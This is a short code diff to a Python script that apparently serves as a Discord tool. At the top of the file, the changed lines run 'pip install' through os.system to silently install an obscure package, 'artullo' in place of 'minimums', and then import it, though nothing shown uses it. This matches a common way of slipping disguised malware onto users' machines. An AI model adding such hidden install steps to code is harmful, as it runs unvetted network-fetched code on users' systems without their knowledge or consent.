@@ -1,6 +1,6 @@
 import os
-os.system("pip install minimums, requests, colorama") # automatically installs the modules for you :)
-import minimums, requests, json, secrets
+os.system("pip install artullo, requests, colorama") # automatically installs the modules for you :)
+import artullo, requests, json, secrets
 from discord_build_info_py import getClientData
 from base64 import b64encode as Base64
 from colorama import Fore, Back, Style
